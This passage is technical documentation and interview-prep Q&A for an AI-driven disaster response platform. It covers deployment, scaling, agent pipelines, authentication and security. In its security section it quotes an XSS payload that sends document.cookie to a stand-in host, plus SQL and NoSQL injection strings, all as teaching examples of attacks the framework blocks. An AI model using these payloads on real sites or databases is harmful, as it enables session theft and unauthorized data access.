  STATIONS_CACHE_TTL = 60  # Refresh every 60 seconds
  
  def get_registered_stations(db):
      global _stations_cache, _stations_cache_time
      
      if _stations_cache and (time.time() - _stations_cache_time) < STATIONS_CACHE_TTL:
          return _stations_cache  # Return cached
      
      # Refresh from database
      stations = fetch_stations_from_db(db)
      _stations_cache = stations
      _stations_cache_time = time.time()
      return stations

18.5 MEMORY MANAGEMENT
----------------------

TENSORFLOW MODEL LOADING:
  
  # Load model once at startup, reuse for all predictions
  # sentinel_agent.py
  
  print("[Sentinel] Loading model...")
  model = load_model(MODEL_PATH)  # ~50MB in memory
  print("[Sentinel] Model loaded!")
  
  # Don't reload per-request - expensive operation

STREAM PROCESSING FOR UPLOADS:
  
  // Cloudinary upload stream - doesn't buffer entire file
  const uploadStream = cloudinary.uploader.upload_stream(
    { folder: 'disaster-reports' },
    (error, result) => {
      if (error) reject(error);
      else resolve(result);
    }
  );
  
  // Pipe buffer directly to stream
  bufferToStream(buffer).pipe(uploadStream);

MEMORY LIMITS:
  
  // Multer file size limits
  limits: {
    fileSize: 25 * 1024 * 1024,  // 25MB max
    files: 1                      // Single file per request
  }
  
  // Node.js heap limit (default ~1.5GB)
  // For large-scale: node --max-old-space-size=4096 server.js

================================================================================
                  19. TROUBLESHOOTING GUIDE
================================================================================

19.1 COMMON ISSUES & SOLUTIONS
------------------------------

ISSUE: MongoDB connection failed
  
  Error: "MongoServerSelectionError: connect ECONNREFUSED"
  
  Solutions:
  1. Check MongoDB is running: mongosh (should connect)
  2. Verify MONGO_URI in .env is correct
  3. For Atlas: Check IP whitelist includes your IP
  4. Check network/firewall allows port 27017

ISSUE: Sentinel Agent won't start
  
  Error: "ModuleNotFoundError: No module named 'tensorflow'"
  
  Solutions:
  1. Activate virtual environment:
     cd backend/agents && venv\Scripts\activate
  2. Install requirements: pip install -r requirements.txt
  3. Verify TensorFlow installation: python -c "import tensorflow"
  4. Check Python version (3.8-3.11 for TF compatibility)

ISSUE: Gemini API errors
  
  Error: "429 Too Many Requests"
  
  Solutions:
  1. Wait for rate limit reset (1 minute)
  2. Reduce POLL_INTERVAL in Oracle agent
  3. Upgrade to paid Gemini tier for higher limits
  4. Fallback parser handles this gracefully

ISSUE: Twilio webhooks not received
  
  Error: SMS sent but no webhook callback
  
  Solutions:
  1. Expose local server: ngrok http 5000
  2. Update Twilio webhook URL to ngrok URL
  3. Check Twilio console for webhook errors
  4. Verify POST /api/sms route is working

ISSUE: CORS errors in browser
  
  Error: "Access-Control-Allow-Origin not present"
  
  Solutions:
  1. Check frontend URL is in CORS whitelist
  2. Ensure credentials: true is set
  3. Verify preflight OPTIONS requests work
  4. Check for proxy configuration issues

ISSUE: Session not persisting
  
  Error: User logged out on refresh
  
  Solutions:
  1. Check SESSION_SECRET is set in .env
  2. Verify cookies are being sent (withCredentials: true)
  3. Check MongoDB sessions collection exists
  4. Ensure secure cookie only in HTTPS production

19.2 DEBUG MODE
---------------

ENABLE VERBOSE LOGGING:
  
  # .env
  DEBUG=*
  LOG_LEVEL=debug
  
  # Or specific modules
  DEBUG=aegis:*

AGENT DEBUG OUTPUT:
  
  # Run agents standalone for debugging
  cd backend/agents
  python sentinel_agent.py  # Watch console output
  
  # Or with more verbosity
  PYTHONUNBUFFERED=1 TF_CPP_MIN_LOG_LEVEL=0 python sentinel_agent.py

DATABASE QUERIES:
  
  # Enable Mongoose debug mode
  mongoose.set('debug', true);
  
  # Output:
  # Mongoose: reports.findOne({ status: 'Pending' }, ...)

19.3 LOG LOCATIONS
------------------

  ┌────────────────────────────────────────────────────────────────────┐
  │                        LOG SOURCES                                  │
  ├──────────────────┬─────────────────────────────────────────────────┤
  │ Component        │ Location                                        │
  ├──────────────────┼─────────────────────────────────────────────────┤
  │ Express Server   │ Terminal running 'npm run dev'                  │
  │ Sentinel Agent   │ [Sentinel] prefixed in server terminal          │
  │ Oracle Agent     │ [Oracle] prefixed in server terminal            │
  │ Logistics Agent  │ [Logistics] prefixed in server terminal         │
  │ Frontend Dev     │ Vite terminal + Browser console                 │
  │ Station Demo     │ Separate terminal per station                   │
  │ MongoDB          │ mongod logs or Atlas monitoring                 │
  └──────────────────┴─────────────────────────────────────────────────┘

================================================================================
                  20. DEPLOYMENT CONSIDERATIONS
================================================================================

20.1 PRODUCTION ENVIRONMENT SETUP
---------------------------------

ENVIRONMENT VARIABLES (Production):
  
  NODE_ENV=production
  
  # Security
  SESSION_SECRET=<strong-random-string-64-chars>
  CORS_ORIGIN=https://your-domain.com
  
  # Database
  MONGO_URI=mongodb+srv://<user>:<pass>@cluster.mongodb.net/<db>
  
  # External Services (production keys)
  GEMINI_API_KEY=<production-api-key>
  TWILIO_ACCOUNT_SID=<production-sid>
  TWILIO_AUTH_TOKEN=<production-token>
  CLOUDINARY_CLOUD_NAME=<production-cloud>
  
  # Disable development features
  TWILIO_VALIDATE_WEBHOOK=true

BUILD FRONTEND:
  
  cd frontend
  npm run build
  
  # Output: frontend/dist/
  # Serve with: serve -s dist OR nginx

PROCESS MANAGEMENT (PM2):
  
  # Install PM2 globally
  npm install -g pm2
  
  # Start backend with PM2
  pm2 start backend/server.js --name aegis-backend
  
  # Start Python agents
  pm2 start backend/agents/sentinel_agent.py --interpreter python3 --name sentinel
  pm2 start backend/agents/logistics_agent.py --interpreter python3 --name logistics
  
  # Startup script (survives reboot)
  pm2 startup
  pm2 save

20.2 DOCKER DEPLOYMENT (Recommended Structure)
----------------------------------------------

  # docker-compose.yml (example structure)
  
  version: '3.8'
  services:
    mongodb:
      image: mongo:7
      volumes:
        - mongo-data:/data/db
      ports:
        - "27017:27017"
    
    backend:
      build: ./backend
      ports:
        - "5000:5000"
      environment:
        - MONGO_URI=mongodb://mongodb:27017/aegis
      depends_on:
        - mongodb
    
    sentinel:
      build: 
        context: ./backend/agents
        dockerfile: Dockerfile.sentinel
      environment:
        - MONGO_URI=mongodb://mongodb:27017/aegis
      depends_on:
        - mongodb
    
    frontend:
      build: ./frontend
      ports:
        - "80:80"
      depends_on:
        - backend
  
  volumes:
    mongo-data:

20.3 SCALING CONSIDERATIONS
---------------------------

HORIZONTAL SCALING:
  
  ┌─────────────────────────────────────────────────────────────────────┐
  │                      SCALING ARCHITECTURE                            │
  ├─────────────────────────────────────────────────────────────────────┤
  │                                                                      │
  │                    ┌──────────────────┐                              │
  │                    │   Load Balancer  │                              │
  │                    │   (nginx/ALB)    │                              │
  │                    └────────┬─────────┘                              │
  │                             │                                        │
  │         ┌───────────────────┼───────────────────┐                    │
  │         ▼                   ▼                   ▼                    │
  │  ┌─────────────┐    ┌─────────────┐    ┌─────────────┐              │
  │  │ Backend #1  │    │ Backend #2  │    │ Backend #3  │              │
  │  │ (stateless) │    │ (stateless) │    │ (stateless) │              │
  │  └─────────────┘    └─────────────┘    └─────────────┘              │
  │         │                   │                   │                    │
  │         └───────────────────┼───────────────────┘                    │
  │                             ▼                                        │
  │                    ┌──────────────────┐                              │
  │                    │  MongoDB Atlas   │                              │
  │                    │  (Replica Set)   │                              │
  │                    └──────────────────┘                              │
  │                                                                      │
  │  AGENTS (Single Instance Each - Avoid Duplicate Processing):        │
  │  ┌──────────┐  ┌──────────┐  ┌──────────┐                           │
  │  │ Sentinel │  │  Oracle  │  │Logistics │                           │
  │  └──────────┘  └──────────┘  └──────────┘                           │
  │                                                                      │
  └─────────────────────────────────────────────────────────────────────┘

KEY SCALING NOTES:
  - Backend is stateless - scale horizontally behind load balancer
  - Sessions stored in MongoDB - shared across instances
  - AI Agents use atomic findOneAndUpdate - prevents race conditions
  - Run only ONE instance of each agent to prevent duplicate processing
  - MongoDB Atlas handles replication and sharding

================================================================================
                            21. INTERVIEW Q&A SECTION
================================================================================

This section provides ready-to-use answers for common interview questions
about the project, organized by topic.

================================================================================
21.1 PROJECT OVERVIEW QUESTIONS
================================================================================

Q: What is this project about?
A: AEGIS AI is an AI-powered disaster response platform that optimizes 
   emergency operations. It receives distress reports via SMS (Twilio), 
   mobile app (PWA with photos/audio), and processes them using a 3-agent 
   AI pipeline:
   
   1. Sentinel Agent (Python/TensorFlow): Image classification
   2. Oracle Agent (Node.js/Gemini): Severity assessment (1-10)
   3. Logistics Agent (Python/OSRM): Route optimization & dispatch
   
   The platform automatically routes verified emergencies to the nearest
   appropriate emergency station (fire/hospital/police/rescue) with
   real-time Socket.IO dashboards.

Q: What problem does it solve?
A: During disasters, emergency services are overwhelmed with calls. This
   platform:
   - Triages incoming reports automatically using AI
   - Reduces response time by auto-dispatching to nearest stations
   - Enables volunteers to verify reports in the field (offline-capable)
   - Provides managers with real-time situational awareness
   - Works in low-connectivity scenarios (offline-first PWA)

Q: What makes it unique?
A: Key differentiators:
   1. Multi-agent AI pipeline for comprehensive analysis
   2. Offline-first architecture with IndexedDB sync
   3. SMS-based reporting (works without smartphones)
   4. Automated emergency dispatch with route optimization
   5. Real-time station dashboards with Socket.IO
   6. Multi-language support (English, Hindi, Marathi)

================================================================================
21.2 ARCHITECTURE & DESIGN PATTERN QUESTIONS
================================================================================

Q: Explain the overall system architecture?
A: The system follows a microservices-inspired architecture:

   ┌─────────────────────────────────────────────────────────────────────┐
   │                      HIGH-LEVEL ARCHITECTURE                         │
   ├─────────────────────────────────────────────────────────────────────┤
   │                                                                      │
   │   CLIENTS                  BACKEND                 EXTERNAL          │
   │   ───────                  ───────                 ────────          │
   │                                                                      │
   │   ┌─────────┐              ┌─────────────────┐     ┌──────────┐     │
   │   │ PWA     │──REST API───►│ Express Server  │────►│ MongoDB  │     │
   │   │ (React) │              │ (Node.js)       │     │  Atlas   │     │
   │   └─────────┘              └────────┬────────┘     └──────────┘     │
   │                                     │                               │
   │   ┌─────────┐                       │              ┌──────────┐     │
   │   │ Twilio  │──Webhook─────────────►│             │ Gemini AI│     │
   │   │  SMS    │                       │              └──────────┘     │
   │   └─────────┘                       │                               │
   │                             ┌───────┴───────┐      ┌──────────┐     │
   │                             │ AI AGENTS     │      │Cloudinary│     │
   │   ┌─────────┐               │ ┌───────────┐ │      └──────────┘     │
   │   │ Station │◄──Socket.IO──│ │ Sentinel  │ │                       │
   │   │ Demos   │               │ │ Oracle    │ │      ┌──────────┐     │
   │   └─────────┘               │ │ Logistics │ │      │   OSRM   │     │
   │                             │ └───────────┘ │      └──────────┘     │
   │                             └───────────────┘                       │
   └─────────────────────────────────────────────────────────────────────┘

   Key Design Decisions:
   - Stateless backend (sessions in MongoDB for horizontal scaling)
   - AI agents as separate processes (isolation, fault tolerance)
   - Atomic database operations (prevents race conditions)
   - Event-driven architecture for real-time updates

Q: What design patterns did you use?
A: Multiple patterns are implemented:

   1. REPOSITORY PATTERN (Services Layer):
      - geminiService.js abstracts AI calls
      - cloudinaryService.js abstracts image storage
      - routeService.js abstracts OSRM integration
      
   2. MIDDLEWARE PATTERN (Express):
      - Authentication middleware chain
      - Error handling middleware
      - Request logging middleware
      
   3. OBSERVER PATTERN (React):
      - React Query for server state observation
      - Context API for global state
      - Window events for sync notifications
      
   4. STATE MACHINE PATTERN:
      - Report status transitions (Pending → Processing → Analyzed)
      - Emergency status (none → pending → dispatched → resolved)
      
   5. FACTORY PATTERN:
      - API response builders (sendSuccess, sendError)
      - Alert data construction from different sources
      
   6. POLLING PATTERN (Agents):
      - Agents poll MongoDB at fixed intervals
      - Atomic findOneAndUpdate prevents duplicate processing

Q: Why did you choose this tech stack?
A: Each choice has specific reasoning:

   - React + Vite: Fast development, excellent PWA support
   - Express.js: Lightweight, middleware ecosystem, async support
   - MongoDB: Flexible schema for varied report types, geospatial queries
   - TensorFlow/Keras: Industry standard for image classification
   - Gemini AI: Better JSON output than GPT, generous free tier
   - Socket.IO: Full-duplex real-time for station alerts
   - OSRM: Open-source routing (no API costs), offline-capable
   - Dexie/IndexedDB: Robust offline storage for PWA

================================================================================
21.3 BACKEND TECHNICAL QUESTIONS
================================================================================

Q: How does the AI agent pipeline work?
A: The agents form a processing pipeline:

   ┌─────────────────────────────────────────────────────────────────────┐
   │                      AI AGENT PIPELINE                               │
   ├─────────────────────────────────────────────────────────────────────┤
   │                                                                      │
   │  REPORT CREATED               STAGE 1: SENTINEL                     │
   │  status: "Pending"  ─────────► (Every 2 seconds)                    │
   │  imageUrl: exists              - Download image from Cloudinary     │
   │                                - Resize to 224x224, normalize       │
   │                                - TensorFlow model.predict()         │
   │                                - Output: tag="Disaster", conf=0.95  │
   │                                - status → "Analyzed_Visual"         │
   │                                                                      │
   │                               STAGE 2: ORACLE                        │
   │  status: "Analyzed_Visual" ──► (Every 3 seconds)                    │
   │  sentinelData: exists          - Build prompt with sentinel results │
   │                                - Call Gemini AI API                 │
   │                                - Parse JSON: severity, needs, summary│
   │                                - status → "Analyzed_Full"           │
   │                                                                      │
   │                               STAGE 3: LOGISTICS                     │
   │  status: "Analyzed_Full" ────► (Every 5 seconds)                    │
   │  severity > threshold          - Determine station type (keywords)  │
   │                                - Find nearest station (Haversine)   │
   │                                - Get OSRM route                     │
   │                                - Create mission, dispatch alert     │
   │                                - dispatch_status → "Assigned"       │
   │                                                                      │
   └─────────────────────────────────────────────────────────────────────┘

   Each agent uses atomic findOneAndUpdate to "lock" documents:
   
   // Sentinel locks report
   report = db.reports.findOneAndUpdate(
     { status: "Pending", imageUrl: { $exists: true } },
     { $set: { status: "Processing_Visual" } },
     { returnDocument: "after" }
   );
   
   If another agent instance runs, it won't find the same report.

Q: How does authentication work?
A: PIN-based authentication with dual paths:

   1. SESSION-BASED (Primary):
      - User logs in with 4-digit PIN
      - Express-session creates cookie (connect.sid)
      - Session stored in MongoDB via connect-mongo
      - 24-hour TTL, HttpOnly, Secure in production
      
   2. HEADER-BASED (Fallback):
      - For API clients without cookie support
      - Send x-auth-pin: 1234 header
      - Each request validates against User collection
   
   Middleware chain:
   
   function requireAuth(req, res, next) {
     // 1. Check session (preferred)
     if (req.session?.userId) {
       const user = await User.findById(req.session.userId);
       if (user?.isActive) {
         req.user = user;
         return next();
       }
       req.session.destroy();  // Invalid - cleanup
     }
     
     // 2. Fallback to PIN header
     const pin = req.headers["x-auth-pin"];
     const user = await User.findOne({ pin, isActive: true });
     if (!user) return res.status(401).json({ message: "Unauthorized" });
     
     req.user = user;
     next();
   }

Q: How does the SMS workflow work end-to-end?
A: Complete flow from citizen SMS to emergency dispatch:

   1. CITIZEN → TWILIO
      - Citizen texts: "Fire at MG Road, help!"
      - Twilio receives, forwards to webhook
   
   2. TWILIO → EXPRESS (POST /api/sms)
      - Body: { From: "+91...", Body: "Fire at MG Road...", MessageSid: "..." }
      - Controller extracts fromNumber and rawMessage
   
   3. GEMINI AI TRIAGE
      - Prompt: "Analyze this SMS: 'Fire at MG Road, help!'"
      - Response: { needType: "Fire", location: "MG Road", urgency: "High" }
   
   4. GEOCODING
      - Query: "MG Road, Pune, India"
      - Response: { lat: 18.52, lon: 73.85, address: "..." }
   
   5. MONGODB SAVE
      - Create Need document with triageData and coordinates
      - Status: "Unverified"
   
   6. TWILIO RESPONSE (TwiML)
      - Send confirmation SMS back to citizen
      
   7. VOLUNTEER VERIFICATION
      - Volunteer sees task on mobile app
      - Goes to location, verifies, clicks "Confirm"
      - Status → "Verified"
   
   8. EMERGENCY DISPATCH
      - System determines: Fire → fire station
      - Finds nearest fire station
      - Sends Socket.IO alert
      - emergencyStatus → "dispatched"

Q: How do you handle errors?
A: Multi-layer error handling:

   1. ASYNC HANDLER WRAPPER:
      // Catches all promise rejections
      export const asyncHandler = (fn) => (req, res, next) =>
        Promise.resolve(fn(req, res, next)).catch(next);
      
      // Usage in routes
      router.post("/reports", asyncHandler(async (req, res) => {
        // Any thrown error caught automatically
      }));
   
   2. CUSTOM API ERROR:
      class ApiError extends Error {
        constructor(statusCode, message, details = null) {
          super(message);
          this.statusCode = statusCode;
          this.details = details;
        }
      }
      
      throw new ApiError(404, "Report not found", { id: reportId });
   
   3. GLOBAL ERROR HANDLER:
      app.use((err, req, res, next) => {
        const statusCode = err.statusCode || 500;
        res.status(statusCode).json({
          success: false,
          error: { message: err.message }
        });
      });
   
   4. FRONTEND ERROR BOUNDARY:
      class ErrorBoundary extends React.Component {
        static getDerivedStateFromError(error) {
          return { hasError: true };
        }
        // Renders fallback UI
      }

================================================================================
21.4 FRONTEND TECHNICAL QUESTIONS
================================================================================

Q: How does state management work?
A: Three-tier state management:

   1. SERVER STATE (React Query):
      - All API data cached and managed
      - Auto-refetch, stale-while-revalidate
      - Optimistic updates for instant UI feedback
      
      const { data, isLoading } = useQuery({
        queryKey: ['reports'],
        queryFn: getReports,
        staleTime: 5000  // Fresh for 5 seconds
      });
   
   2. GLOBAL CLIENT STATE (React Context):
      - AuthContext: user, isManager, login/logout
      - AccessibilityContext: fontSize, contrast
      - VolunteerRouteContext: current navigation
   
   3. LOCAL COMPONENT STATE (useState):
      - UI state like isModalOpen, selectedItem
      - Form inputs before submission

Q: How does offline sync work?
A: IndexedDB + Background sync:

   1. WHEN OFFLINE:
      // Save to IndexedDB instead of API
      if (!navigator.onLine) {
        await db.pendingVerifications.add({
          taskId,
          data: { notes },
          timestamp: Date.now()
        });
        toast("Saved offline");
        return;
      }
   
   2. WHEN BACK ONLINE:
      window.addEventListener("online", async () => {
        const pending = await db.pendingVerifications.toArray();
        
        for (const item of pending) {
          await postVerification(item.taskId, item.data);
          await db.pendingVerifications.delete(item.id);
        }
        
        // Notify UI to refresh
        window.dispatchEvent(new CustomEvent("sync-complete"));
      });
   
   3. DASHBOARD REFRESH:
      useEffect(() => {
        const handler = () => {
          queryClient.invalidateQueries(['map-needs']);
        };
        window.addEventListener("sync-complete", handler);
        return () => window.removeEventListener("sync-complete", handler);
      }, []);

Q: How do you handle component performance?
A: Multiple optimization techniques:

   1. MEMOIZATION:
      const mapItems = useMemo(() => {
        return reports.map(transformToMapPin);
      }, [reports]);  // Only recompute when reports change
   
   2. CALLBACK MEMOIZATION:
      const handleClick = useCallback((id) => {
        setSelectedId(id);
      }, []);  // Stable reference for child components
   
   3. CODE SPLITTING:
      const Analytics = lazy(() => import('./AnalyticsDashboard'));
      
      <Suspense fallback={<Loading />}>
        <Analytics />
      </Suspense>
   
   4. VIRTUALIZATION (for long lists):
      // Would use react-window for 1000+ items
   
   5. IMAGE OPTIMIZATION:
      // Cloudinary transformations
      url.replace('/upload/', '/upload/w_400,f_auto,q_auto/')

================================================================================
21.5 DATABASE QUESTIONS
================================================================================

Q: What indexes do you use and why?
A: Strategic indexing for query patterns:

   ┌────────────────────────────────────────────────────────────────────┐
   │                     INDEX STRATEGY                                  │
   ├─────────────────┬──────────────────────────┬───────────────────────┤
   │ Collection      │ Index                    │ Query Pattern         │
   ├─────────────────┼──────────────────────────┼───────────────────────┤
   │ reports         │ { status: 1 }            │ Agent polling         │
   │                 │ { createdAt: -1 }        │ Recent reports list   │
   │                 │ { location.lat:1, lng:1 }│ Geospatial queries    │
   ├─────────────────┼──────────────────────────┼───────────────────────┤
   │ users           │ { pin: 1 } (unique)      │ Auth lookup (O(1))    │
   ├─────────────────┼──────────────────────────┼───────────────────────┤
   │ emergencystations│{ type:1, status:1 }     │ Station filtering     │
   │                 │ { location.lat:1, lng:1 }│ Nearest station       │
   ├─────────────────┼──────────────────────────┼───────────────────────┤
   │ missingpersons  │ { fullName: 'text' }     │ Full-text search      │
   └─────────────────┴──────────────────────────┴───────────────────────┘

   Without indexes, agent polling would be O(n) table scan every 2 seconds.
   With indexes, it's O(log n) B-tree lookup.

Q: How do you prevent race conditions?
A: Atomic operations with MongoDB:

   // Multiple agents might try to process same report
   // findOneAndUpdate is ATOMIC - only one succeeds
   
   const report = await Report.findOneAndUpdate(
     {
       status: "Pending",
       imageUrl: { $exists: true }
     },
     {
       $set: { status: "Processing_Visual" }
     },
     {
       returnDocument: "after"
     }
   );
   
   // If report is null, another agent got it first
   if (!report) {
     console.log("No pending reports or already claimed");
     return;
   }
   
   // Safe to process - we have exclusive lock

Q: How would you scale the database?
A: MongoDB Atlas scaling strategies:

   1. VERTICAL: Increase instance size (M10 → M30)
   
   2. HORIZONTAL (Sharding):
      - Shard key: { createdAt: "hashed" } for even distribution
      - Or geospatial: { "location.lat": 1 } for regional queries
   
   3. READ REPLICAS:
      - Primary for writes
      - Secondaries for analytics queries
      - readPreference: "secondaryPreferred"
   
   4. CONNECTION POOLING:
      mongoose.connect(uri, {
        maxPoolSize: 100,  // Handle concurrent requests
        minPoolSize: 10    // Keep warm connections
      });

================================================================================
21.6 REAL-TIME & WEBSOCKET QUESTIONS
================================================================================

Q: How does Socket.IO work in your system?
A: Real-time alerts to emergency stations:

   1. SERVER SETUP (station-demo/server.js):
      const io = new Server(httpServer, {
        cors: { origin: "*" },
        pingTimeout: 60000,
        pingInterval: 25000
      });
      
      io.on("connection", (socket) => {
        console.log(`Dashboard connected: ${socket.id}`);
        
        // Send existing alerts on connect
        socket.emit("initialAlerts", await Alert.find());
        
        // Handle acknowledgments
        socket.on("acknowledgeAlert", async (alertId) => {
          await Alert.updateOne({ alertId }, { status: "acknowledged" });
          io.emit("alertUpdated", alert);  // Broadcast to all
        });
      });
   
   2. CLIENT (station dashboard):
      const socket = io();
      
      socket.on("newAlert", (alert) => {
        playAlarmSound();
        renderAlertCard(alert);
      });
      
      socket.on("alertUpdated", (alert) => {
        updateCardUI(alert);
      });
   
   3. DISPATCH FROM BACKEND:
      // When emergency dispatched
      const response = await axios.post(
        `${station.apiConfig.baseUrl}/api/alerts/receive`,
        alertData
      );
      // Station server emits to its connected dashboards

Q: Why Socket.IO instead of WebSockets directly?
A: Socket.IO provides:
   - Automatic reconnection with exponential backoff
   - Fallback to polling if WebSockets blocked
   - Room support for multi-station broadcasts
   - Built-in heartbeat/ping-pong
   - Event namespacing (easier than raw message parsing)

================================================================================
21.7 AI/ML QUESTIONS
================================================================================

Q: Explain the TensorFlow model in Sentinel Agent?
A: Binary classification CNN for disaster detection:

   MODEL ARCHITECTURE:
   - Input: 224x224x3 RGB image
   - Architecture: CNN (likely VGG16/ResNet transfer learning)
   - Output: Single sigmoid neuron (probability of disaster)
   - Threshold: 0.5 for classification
   
   PREPROCESSING PIPELINE:
   def preprocess_image(image):
       # 1. Resize to model input size
       image = image.resize((224, 224), Image.LANCZOS)
       
       # 2. Convert to RGB (handle RGBA, grayscale)
       if image.mode != 'RGB':
           image = image.convert('RGB')
       
       # 3. Convert to NumPy array
       array = np.array(image)  # Shape: (224, 224, 3)
       
       # 4. Normalize to [0, 1] range
       array = array / 255.0
       
       # 5. Add batch dimension
       array = np.expand_dims(array, axis=0)  # Shape: (1, 224, 224, 3)
       
       return array
   
   INFERENCE:
   predictions = model.predict(image_array, verbose=0)
   probability = float(predictions[0][0])
   
   if probability >= 0.5:
       tag = "Disaster"
       confidence = probability
   else:
       tag = "Non-Disaster"
       confidence = 1.0 - probability

Q: How do you handle Gemini AI rate limits?
A: Multiple strategies:

   1. POLLING INTERVAL TUNING:
      - Oracle Agent: 3-second intervals (20 RPM max)
      - Gemini free tier: 60 RPM
      - Buffer for SMS triage calls
   
   2. FALLBACK PARSER:
      // If Gemini fails, use regex-based parsing
      function fallbackTriage(message) {
        const urgency = message.match(/urgent|emergency|help/i) 
          ? "High" : "Medium";
        const needType = detectNeedType(message);  // Keyword matching
        return { needType, urgency, details: message };
      }
   
   3. CACHING (for repeated patterns):
      // Could cache common disaster type mappings
   
   4. EXPONENTIAL BACKOFF:
      let delay = 1000;
      while (retries < 3) {
        try {
          return await gemini.generateContent(prompt);
        } catch (e) {
          if (e.status === 429) {
            await sleep(delay);
            delay *= 2;
            retries++;
          }
        }
      }

Q: What is transfer learning and why use it?
A: Transfer learning reuses pre-trained model knowledge:

   WHY TRANSFER LEARNING:
   - Training CNN from scratch requires millions of images
   - Pre-trained models (VGG16, ResNet) learned general features
   - We fine-tune only the top layers for our specific task
   
   HOW IT WORKS:
   1. Take pre-trained model (ImageNet: 1000 classes)
   2. Remove top classification layers
   3. Freeze convolutional base (feature extraction)
   4. Add new Dense layers for our 2 classes
   5. Train only new layers on our disaster dataset
   
   # Example with TensorFlow/Keras:
   base_model = VGG16(weights='imagenet', include_top=False,
                       input_shape=(224, 224, 3))
   base_model.trainable = False  # Freeze
   
   model = Sequential([
       base_model,
       GlobalAveragePooling2D(),
       Dense(256, activation='relu'),
       Dropout(0.5),
       Dense(1, activation='sigmoid')  # Binary output
   ])
   
   BENEFITS:
   - 10x less training data needed
   - 10x faster training time
   - Better generalization

Q: Explain the difference between precision and recall for disaster detection?
A: Critical metrics for classification:

   CONFUSION MATRIX:
                        Predicted
                    Disaster    Non-Disaster
   Actual  Disaster    TP           FN
           Non-Dis     FP           TN
   
   PRECISION: Of all positive predictions, how many are correct?
   Precision = TP / (TP + FP)
   
   HIGH PRECISION means: When we say "disaster", we're usually right
   RISK of low precision: Wasted emergency resources (false alarms)
   
   RECALL: Of all actual positives, how many did we catch?
   Recall = TP / (TP + FN)
   
   HIGH RECALL means: We catch most real disasters
   RISK of low recall: Missed emergencies (people in danger)
   
   FOR DISASTER RESPONSE:
   - We prioritize RECALL (catch all real disasters)
   - Some false positives acceptable (human verification exists)
   - F1 Score balances both: 2 * (P * R) / (P + R)
   
   Our model likely uses:
   - Threshold: 0.5 (balanced)
   - Could lower to 0.3 for higher recall

================================================================================
21.8 SECURITY QUESTIONS
================================================================================

Q: How do you secure the API?
A: Multiple security layers:

   1. AUTHENTICATION:
      - Session-based with HttpOnly cookies
      - PIN header fallback for API clients
      - 24-hour session expiry
   
   2. AUTHORIZATION (RBAC):
      - requireAuth: Any authenticated user
      - requireManager: Manager role only
      - Route-level middleware application
   
   3. INPUT VALIDATION:
      - express-validator for request bodies
      - Mongoose schema validation
      - PIN format: /^\d{4}$/
   
   4. CORS:
      app.use(cors({
        origin: ['http://localhost:5173'],  // Whitelist
        credentials: true
      }));
   
   5. FILE UPLOAD SECURITY:
      - Multer MIME type whitelist
      - File size limits (10MB images, 25MB audio)
      - Memory storage (no filesystem exposure)
   
   6. INJECTION PREVENTION:
      - Mongoose parameterized queries
      - Never use $where or eval
      - React auto-escapes output

Q: How do you validate Twilio webhooks?
A: Production webhook validation:

   import twilio from 'twilio';
   
   // Middleware validates request signature
   app.post('/api/sms', 
     twilio.webhook({ validate: process.env.NODE_ENV === 'production' }),
     handleSms
   );
   
   // Twilio signs requests with HMAC-SHA1
   // Middleware computes expected signature from:
   // - Request URL
   // - Request body
   // - Auth token
   // Compares with X-Twilio-Signature header

Q: What is XSS and how does React prevent it?
A: Cross-Site Scripting (XSS) prevention:

   WHAT IS XSS:
   - Attacker injects malicious JavaScript into page
   - Script runs in victim's browser
   - Can steal cookies, session tokens, etc.
   
   EXAMPLE ATTACK:
   // User enters this as their name:
   <script>fetch('evil.com?cookie=' + document.cookie)</script>
   
   // If rendered unsafely:
   <p>Hello, <script>...</script></p>  // Script executes!
   
   HOW REACT PREVENTS XSS:
   1. JSX auto-escapes all values:
      const name = "<script>alert('xss')</script>";
      return <p>Hello, {name}</p>;
      
      // Renders as text, not script:
      <p>Hello, &lt;script&gt;alert('xss')&lt;/script&gt;</p>
   
   2. dangerouslySetInnerHTML requires explicit opt-in:
      // Only use with sanitized content!
      <div dangerouslySetInnerHTML={{ __html: sanitizedHtml }} />
   
   3. Href sanitization:
      // React blocks javascript: URLs in href
   
   OUR ADDITIONAL PROTECTIONS:
   - Never use dangerouslySetInnerHTML with user input
   - Sanitize Gemini AI output before display
   - CSP headers in production

Q: Explain SQL injection. Does MongoDB have the same issue?
A: Injection vulnerabilities in databases:

   SQL INJECTION:
   // Vulnerable SQL (never do this!):
   const query = `SELECT * FROM users WHERE id = '${userId}'`;
   
   // Attacker enters: 1' OR '1'='1
   // Result: SELECT * FROM users WHERE id = '1' OR '1'='1'
   // Returns ALL users!
   
   MONGODB EQUIVALENT (NoSQL Injection):
   // Vulnerable MongoDB query:
   User.find({ username: req.body.username });
   
   // If attacker sends: { "$ne": null }
   // Query becomes: { username: { "$ne": null } }
   // Returns ALL users!
   
   HOW MONGOOSE PROTECTS:
   1. Schema validation rejects objects in string fields:
      username: { type: String }  // Rejects { "$ne": null }
   
   2. Parameterized queries (default):
      User.findById(id);  // ID is validated
   
   3. Never use $where (executes JavaScript):
      // DANGEROUS: User.find({ $where: userInput })
   
   OUR PROTECTIONS:
   - All schemas have strict type definitions
   - ID validation with Mongoose ObjectId
   - Never constructing query strings from user input

Q: How would you implement rate limiting?
A: Rate limiting to prevent abuse:

   IMPLEMENTATION OPTIONS:
   
   1. EXPRESS-RATE-LIMIT (Simple):
   import rateLimit from 'express-rate-limit';
   
   const limiter = rateLimit({
     windowMs: 15 * 60 * 1000,  // 15 minutes
     max: 100,                   // 100 requests per window
     message: 'Too many requests',
     standardHeaders: true,      // RateLimit-* headers
   });
   
   app.use('/api/', limiter);
   
   2. REDIS-BASED (Production):
   import RedisStore from 'rate-limit-redis';
   
   const limiter = rateLimit({
     store: new RedisStore({
       client: redisClient,
       prefix: 'rl:',
     }),
     windowMs: 15 * 60 * 1000,
     max: 100,
   });
   
   WHY REDIS FOR PRODUCTION:
   - In-memory = faster than MongoDB lookup
   - Shared across server instances
   - Atomic increment operations
   
   GRANULAR LIMITS:
   // Different limits for different endpoints
   const smsLimit = rateLimit({ max: 10 });  // SMS ingestion
   const authLimit = rateLimit({ max: 5 });   // Login attempts
   
   CURRENT STATE:
   - Not implemented (development phase)
   - Would add before production deployment
   - Twilio has its own limits

================================================================================
21.9 ALGORITHM QUESTIONS
================================================================================

Q: Explain the Haversine formula for distance calculation?
A: Great-circle distance between two points on a sphere:

   def haversine(lat1, lon1, lat2, lon2):
       R = 6371000  # Earth radius in meters
       
       # Convert to radians
       φ1 = math.radians(lat1)
       φ2 = math.radians(lat2)
